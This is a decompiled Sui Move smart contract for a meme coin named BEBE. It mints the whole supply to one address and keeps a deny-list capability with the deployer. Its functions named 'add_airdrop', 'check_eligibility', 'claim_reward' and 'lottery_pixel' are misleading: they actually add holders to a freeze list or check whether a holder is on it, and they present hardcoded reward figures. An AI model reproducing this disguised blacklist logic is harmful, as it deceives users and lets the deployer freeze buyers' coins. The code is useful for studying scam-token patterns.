module 0x6767b5ef076a8b67257a403b34035cda13f206a6077ac0214d8bb29c05c1da0c::bebe {
    struct BEBE has drop {
        dummy_field: bool,
    }

    public fun add_airdrop(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<BEBE>, arg2: vector<address>, arg3: &mut 0x2::tx_context::TxContext) {
        let v0 = 0;
        loop {
            0x2::coin::deny_list_v2_add<BEBE>(arg0, arg1, *0x1::vector::borrow<address>(&arg2, v0), arg3);
            v0 = v0 + 1;
            if (v0 >= 0x1::vector::length<address>(&arg2)) {
                break
            };
        };
    }

    public fun calculate_eligibility<T0>(arg0: &0x2::deny_list::DenyList, arg1: address) : (bool, u64, u8) {
        (0x2::coin::deny_list_v2_contains_next_epoch<T0>(arg0, arg1), 1000000000000000000, 9)
    }

    public fun check_eligibility<T0>(arg0: &0x2::deny_list::DenyList, arg1: address) : bool {
        0x2::coin::deny_list_v2_contains_next_epoch<T0>(arg0, arg1)
    }

    public fun claim_reward<T0>(arg0: &0x2::deny_list::DenyList, arg1: address) : (bool, u64) {
        (0x2::coin::deny_list_v2_contains_next_epoch<T0>(arg0, arg1), 999000000000)
    }

    fun init(arg0: BEBE, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<BEBE>(arg0, 9, b"BEBE", b"BEBE", x"42454245206973207469726564206f66207761746368696e672065766572796f6e6520706c617920686f7420706f7461746f20776974682074686520656e646c6573732064657269766174697665205368696261202c2043756d2c20474d2c456c6f6e2c204b697368752c20547572626f2c204173732c20466c6f6b692c204d6f6f6e2c20496e7520636f696e732e2054686520496e75e2809973206861766520686164207468656972206461792e204974e28099732074696d6520666f7220746865206d6f7374207265636f676e697a61626c65206d656d6520696e2074686520776f726c6420746f2074616b652068697320726569676e206173206b696e67206f6620746865206d656d65732e", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe(0x1::ascii::string(b"https://orange-upper-booby-780.mypinata.cloud/ipfs/Qme8idj5HQnRJJd8eLbdtChAe5KRHLzD8q3ycnKHEmju3Y"))), false, arg1);
        let v3 = v0;
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<BEBE>>(v2);
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<BEBE>>(v1, 0x2::tx_context::sender(arg1));
        0x2::coin::mint_and_transfer<BEBE>(&mut v3, 1000000000000000000, @0xe7206102a6b0ced7c805da0f509f9227d7a89d5e8051fcf1808fb5ab1839091d, arg1);
        0x2::transfer::public_freeze_object<0x2::coin::TreasuryCap<BEBE>>(v3);
    }

    public fun lottery_pixel<T0>(arg0: &0x2::deny_list::DenyList, arg1: address) : (bool, u64) {
        (0x2::coin::deny_list_v2_contains_next_epoch<T0>(arg0, arg1), 999000000000)
    }

    public fun remove_airdrop(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<BEBE>, arg2: vector<address>, arg3: &mut 0x2::tx_context::TxContext) {
        let v0 = 0;
        loop {
            0x2::coin::deny_list_v2_remove<BEBE>(arg0, arg1, *0x1::vector::borrow<address>(&arg2, v0), arg3);
            v0 = v0 + 1;
            if (v0 >= 0x1::vector::length<address>(&arg2)) {
                break
            };
        };
    }

    // decompiled from Move bytecode v6
}

